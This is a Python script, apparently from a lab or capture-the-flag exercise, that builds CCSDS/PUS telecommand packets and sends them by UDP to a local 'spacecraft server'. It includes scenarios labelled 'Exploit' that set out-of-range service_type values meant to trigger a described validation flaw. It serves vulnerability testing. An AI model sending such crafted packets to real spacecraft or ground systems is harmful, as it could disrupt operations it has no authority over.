#!/usr/bin/env python3
"""
Script to send CCSDS/PUS test packets to the spacecraft server.

This sends specially crafted packets to trigger the vulnerability path:
- CCSDS header (6 bytes)
- PUS header with service_type byte
- Payload data

The service_type byte will be read by the server at address 0x3285
and processed with insufficient validation at address 0x2e40.
"""

import argparse
import socket
import struct
import sys
import time
from typing import List, Tuple


def create_ccsds_pus_packet(
    service_type: int = 0x01,
    service_subtype: int = 0x12,
    destination_id: int = 0x1234,
    apid: int = 0x100,
    sequence: int = 0,
    payload: bytes = b""
) -> bytes:
    """
    Create a CCSDS/PUS packet with specified parameters.

    CCSDS Primary Header (6 bytes):
    - Byte 0-1: Packet Identification (Version, Type, Secondary Header Flag, APID)
    - Byte 2-3: Packet Sequence Control (Sequence Flags, Sequence Count)
    - Byte 4-5: Packet Data Length (Length of data field - 1)

    PUS Telecommand Header (following CCSDS header):
    - Byte 0: PUS Version Number (upper 4 bits) + spare (lower 4 bits)
    - Byte 1: Service Type (🚨 CRITICAL - This is the vulnerability point)
    - Byte 2: Service Subtype
    - Byte 3+: Additional PUS data
    """

    # CCSDS Primary Header (6 bytes)
    # Packet ID: Version(3 bits)=0, Type(1 bit)=1(TC), Secondary Header(1 bit)=1, APID(11 bits)
    packet_id = (0 << 13) | (1 << 12) | (1 << 11) | (apid & 0x7FF)

    # Packet Sequence Control: Grouping(2 bits)=11(standalone), Sequence(14 bits)
    packet_seq = (3 << 14) | (sequence & 0x3FFF)

    # PUS Header (minimum 3 bytes for TC)
    pus_version = 0x08  # PUS Version C (bits 7-4), spare (bits 3-0)

    # Calculate packet data length (everything after CCSDS header - 1)
    pus_header_size = 3  # version + service_type + service_subtype
    packet_data_length = pus_header_size + len(payload) - 1

    # Build CCSDS header
    ccsds_header = struct.pack(
        ">HHH",  # Big-endian, 3 x 16-bit
        packet_id,
        packet_seq,
        packet_data_length
    )

    # Build PUS header
    pus_header = struct.pack(
        "BBB",  # 3 bytes
        pus_version,
        service_type,  # 🚨 CRITICAL BYTE - read at 0x3285, validated at 0x2e40
        service_subtype
    )

    # Combine all parts
    packet = ccsds_header + pus_header + payload

    return packet


def send_packet(
    host: str,
    port: int,
    packet: bytes,
    delay: float = 0.1
) -> bool:
    """Send a UDP packet to the server."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(packet, (host, port))
        sock.close()
        time.sleep(delay)
        return True
    except Exception as e:
        print(f"  ❌ Failed to send packet: {e}")
        return False


def print_packet_hex(packet: bytes) -> None:
    """Print packet in hex format."""
    hex_str = " ".join(f"{b:02x}" for b in packet)
    print(f"  Packet ({len(packet)} bytes): {hex_str}")


def create_test_scenarios() -> List[Tuple[str, dict]]:
    """Create various test scenarios to trigger different code paths."""
    scenarios = [
        ("Valid service_type=0x01", {
            "service_type": 0x01,
            "service_subtype": 0x12,
            "destination_id": 0x1234,
            "payload": b"\x00\x00\x00\x00"
        }),
        ("Edge case: service_type=0x00", {
            "service_type": 0x00,
            "service_subtype": 0x01,
            "destination_id": 0x1234,
            "payload": b"\x00\x00\x00\x00"
        }),
        ("Exploit: service_type=0xFF (255)", {
            "service_type": 0xFF,
            "service_subtype": 0x01,
            "destination_id": 0x1234,
            "payload": b"\xDE\xAD\xBE\xEF"
        }),
        ("Exploit: service_type=0x80 (128)", {
            "service_type": 0x80,
            "service_subtype": 0x02,
            "destination_id": 0x1234,
            "payload": b"\xCA\xFE\xBA\xBE"
        }),
        ("Valid service_type=0x05", {
            "service_type": 0x05,
            "service_subtype": 0x01,
            "destination_id": 0x1234,
            "payload": b"\x11\x22\x33\x44"
        }),
    ]
    return scenarios


def main():
    parser = argparse.ArgumentParser(
        description="Send CCSDS/PUS test packets to spacecraft server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Send default packet
  python send_test_packet.py

  # Send custom packet
  python send_test_packet.py --host 127.0.0.1 --port 5555 --service-type 0xFF

  # Send multiple test scenarios
  python send_test_packet.py --scenarios

  # Continuous sending (for tracing)
  python send_test_packet.py --continuous --interval 2.0
        """
    )

    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="Server hostname or IP (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=5555,
        help="Server UDP port (default: 5555)"
    )
    parser.add_argument(
        "--service-type",
        type=lambda x: int(x, 0),  # Accept hex (0xFF) or decimal (255)
        default=0x01,
        help="Service type byte (hex or decimal, e.g., 0xFF or 255)"
    )
    parser.add_argument(
        "--service-subtype",
        type=lambda x: int(x, 0),
        default=0x12,
        help="Service subtype byte"
    )
    parser.add_argument(
        "--destination-id",
        type=lambda x: int(x, 0),
        default=0x1234,
        help="Destination ID"
    )
    parser.add_argument(
        "--payload",
        type=str,
        default="",
        help="Additional payload as hex string (e.g., 'deadbeef')"
    )
    parser.add_argument(
        "--scenarios",
        action="store_true",
        help="Send all test scenarios"
    )
    parser.add_argument(
        "--continuous",
        action="store_true",
        help="Send packets continuously (use with --interval)"
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Interval between packets in seconds (default: 1.0)"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=0,
        help="Number of packets to send (0 = infinite with --continuous)"
    )

    args = parser.parse_args()

    print("="*80)
    print("CCSDS/PUS PACKET SENDER")
    print("="*80)
    print(f"Target: {args.host}:{args.port}")
    print("="*80)
    print()

    if args.scenarios:
        # Send all test scenarios
        scenarios = create_test_scenarios()
        print(f"Sending {len(scenarios)} test scenarios...\n")

        for i, (name, params) in enumerate(scenarios, 1):
            print(f"[{i}/{len(scenarios)}] {name}")

            # Parse payload if string
            payload = params.get("payload", b"")

            packet = create_ccsds_pus_packet(
                service_type=params.get("service_type", 0x01),
                service_subtype=params.get("service_subtype", 0x12),
                destination_id=params.get("destination_id", 0x1234),
                payload=payload
            )

            print_packet_hex(packet)

            if send_packet(args.host, args.port, packet, args.interval):
                print("  ✅ Sent successfully")
            print()

        print(f"✅ All {len(scenarios)} scenarios sent!")

    elif args.continuous:
        # Continuous sending mode
        print(f"Continuous mode: sending every {args.interval}s")
        if args.count > 0:
            print(f"Will send {args.count} packets")
        else:
            print("Will send indefinitely (Ctrl+C to stop)")
        print()

        # Parse payload
        payload = b""
        if args.payload:
            try:
                payload = bytes.fromhex(args.payload)
            except ValueError:
                print(f"⚠️  Invalid hex payload: {args.payload}, using empty")

        packet = create_ccsds_pus_packet(
            service_type=args.service_type,
            service_subtype=args.service_subtype,
            destination_id=args.destination_id,
            payload=payload
        )

        print(f"Packet configuration:")
        print(f"  Service type: 0x{args.service_type:02x} ({args.service_type})")
        print(f"  Service subtype: 0x{args.service_subtype:02x}")
        print(f"  Destination ID: 0x{args.destination_id:04x}")
        print_packet_hex(packet)
        print()

        sent_count = 0
        try:
            while args.count == 0 or sent_count < args.count:
                if send_packet(args.host, args.port, packet, args.interval):
                    sent_count += 1
                    print(f"  [{sent_count}] Packet sent at {time.strftime('%H:%M:%S')}")
                else:
                    break
        except KeyboardInterrupt:
            print(f"\n\n⚠️  Interrupted by user")

        print(f"\n✅ Sent {sent_count} packets total")

    else:
        # Single packet mode
        print("Sending single packet...\n")

        # Parse payload
        payload = b""
        if args.payload:
            try:
                payload = bytes.fromhex(args.payload)
            except ValueError:
                print(f"⚠️  Invalid hex payload: {args.payload}, using empty")

        packet = create_ccsds_pus_packet(
            service_type=args.service_type,
            service_subtype=args.service_subtype,
            destination_id=args.destination_id,
            payload=payload
        )

        print(f"Packet configuration:")
        print(f"  Service type: 0x{args.service_type:02x} ({args.service_type})")
        print(f"  Service subtype: 0x{args.service_subtype:02x}")
        print(f"  Destination ID: 0x{args.destination_id:04x}")
        print_packet_hex(packet)
        print()

        if send_packet(args.host, args.port, packet):
            print("✅ Packet sent successfully!")
        else:
            return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
